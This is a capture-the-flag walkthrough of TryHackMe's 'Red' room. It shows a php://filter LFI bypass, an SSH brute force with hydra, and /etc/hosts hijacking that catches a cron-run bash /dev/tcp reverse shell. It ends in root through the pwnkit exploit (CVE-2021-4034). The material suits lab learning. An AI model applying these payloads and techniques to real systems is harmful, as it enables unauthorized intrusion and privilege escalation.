# Red

https://tryhackme.com/room/redisl33t

*A classic battle for the ages.* - rated Easy

A pretty fun room! Few twists and turns, nothing too complicated, and similar to my [Hacker vs. Hacker room](https://tryhackme.com/room/hackervshacker) with its simulation of an on-machine adversary looking to bump your shells, though I think this room does it better :)

1. Scanning reveals just two ports, 22 and 80. On 80 is a brochure-ware site, which immediately suggests some form of LFI as its home page is `/index.php?page=home.html`. Further enumeration of the site doesnt reveal anything interesting.

2. The LFI doesn't work with simple payloads, e.g. `?page=/etc/passwd` or `?page=../../../../../etc/passwd`. However, using a php filter like `?page=php://filter/convert.base64-encode/resource=index.php` allows us to read the index.php source code (after reversing the base64 encoding): 

	```php
	<?php 

    function sanitize_input($param) {
        $param1 = str_replace("../","",$param);
        $param2 = str_replace("./","",$param1);
        return $param2;
    }
    
    $page = $_GET['page'];
    if (isset($page) && preg_match("/^[a-z]/", $page)) {
        $page = sanitize_input($page);
        readfile($page);
    } else {
        header('Location: /index.php?page=home.html');
    }
    
    ?>
	```

3. This shows two protections: `preg_match("/^[a-z]/", $page)` ensures that the first character of the page must be an alphabetic character, and the `sanitize_input` function prevents any path traversal. As shown by using the php filter, this is an easy way to bypass this (as the first character is `p` in `php://`) - in fact it can be simplified, and you can read the passwd file with `?page=php://filter/resource=/etc/passwd`: no path traversal, as we are using an absolute path. This reveals there are two users of note (aside from root): `red` and `blue`.

4. We can only read files - the `readfile` function will prevent loading PHP code (it will be read as text). Interestingly, we can read from remote addresses like the attack box, but without PHP interpretation this seems worthless. So, enumerating some interesting files is the path forward. Eventually, trying for /home/blue/.bash_history revealed something interesting:

	```
	echo "Red rules"
    cd
    hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
    cat passlist.txt
    rm passlist.txt
    sudo apt-get remove hashcat -y
	```

5. Reading `.reminder` revealed `sup3r_p@s$w0rd!`. To replicate the process to generate random password variations, on the THM attack box the command `hashcat --stdout .reminder -r /opt/hashcat/rules/best64.rule > passlist.txt` was used (the `best64.rule` file is in a different location than on the target). Then, the password was brute forced with `hydra -l blue -P passlist.txt ssh://[targetIP]`

> Note, the password seemed to change every minute, so it was best to keep this hydra command handy.

6. Logging on as blue, **the first flag** is in their home directory. Several messages are eventually sent your way and eventually the session is killed, as the room description suggested would happen. To avoid this, use ssh `blue@[targetIP] -T` - `-T` doesn't create a pts file, meaning standard methods of killing user sessions don't work. This is a common trick in THMs [King of the Hill](https://tryhackme.com/games/koth) game mode, which I document here on [my koth tips and tricks](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/README.md#general-tips-and-tricks).

7. Poking about, you can see an interesting process being run every minute via `ps aux`: `bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001` - this is being run as the user `red`, the next target user, and if there is a listener on 9001 on redrules.thm this will grant a rev shell. If you cat /etc/hosts to see where redrules.thm is, you will see:

	```
	127.0.0.1 localhost
    127.0.1.1 red
    192.168.0.1 redrules.thm
    
    # The following lines are desirable for IPv6 capable hosts
    ::1     ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouter
	```

8. The IP address 192.168.0.1 does not exist in this network. If you use `ls -la` on `/etc/hosts` you will see it has the permissions `-rw-r--rw- 1 root adm 242 Jul 14 21:27 /etc/hosts` - this suggests it *should* be writable, however attempts to do so will fail. When a file is supposedly writable but you can't edit it, a KOTH trick is to check its extra attributes. This can be done with `lsattr /etc/hosts` which will reveal: `-----a--------e----- /etc/hosts`. That is, the file can be appended to only. Therefore `echo test >> /etc/hosts` will work.

9. Hosts seems to follow a latest rule found approach, so adding your attack box to hosts like `echo [attackboxIP] redrules.thm >> /etc/hosts` works and then starting a listener `nc -nvlp 9001` will quickly get you a reverse shell as red.

> much like blue's password, the hosts file is reverted on a regular basis so you might need to repeat this process more than once.

10. **The second flag** is in red's home directory. Enumerating the machine a couple of things stand out. First, there is a .git folder in red's home dir, but it doesn't represent a git repo. Instead it contains a copy of pkexec, with the suid bit set. This doesn't immediately indicate escalation, as pkexec is supposed to have the suid bit and will fail if it doesn't. In fact, the normal pkexec file, with the same size and hash and so the same version of pkexec, is still located in its normal place, escept the suid bit has been removed - if you try to run it it will fail.

11. Checking the version of pkexec can be done with `/home/red/.git/pkexec --version`, which reports 0.105. A quick goog will find CVE-2021-4034, a local privilege vuln. This will not work with regular pkexec because of the missing suid bit, but should work with the hidden copy in red's folder.

12. The exploit I used was from here: https://packetstormsecurity.com/files/165739/PolicyKit-1-0.105-31-Privilege-Escalation.html. It involves creating a `makefile`, `evil-so.c` and `exploit.c` file on the attack box, **altering `exploit.c` so that the path to pkexec uses the path for red's copy**, running `make`, then copying the created `evil.so` and `exploit` to the target machine (/tmp is writable, so I placed them there). Running `chmod +x exploit` and then `./exploit` granted a root shell.

> Note this compiles fine on the THM attack box (ubuntu based), and runs fine on the target. If using Kali or another distro it might not compile or compile and then not run with libc errors. Its possible to resolve this by ensuring that the target libc version is used, compiling statically or other means. Elsewise, you can use https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py or something else, a pure python solution.

13. The **final flag** is under `/root` as normal. Additionally, under `/root/defense`, you can see all the little scripts used to simulate the attacker, which is neat.

So yeah, fun room. Used a few techniques I haven't seen in rooms for a good long while.
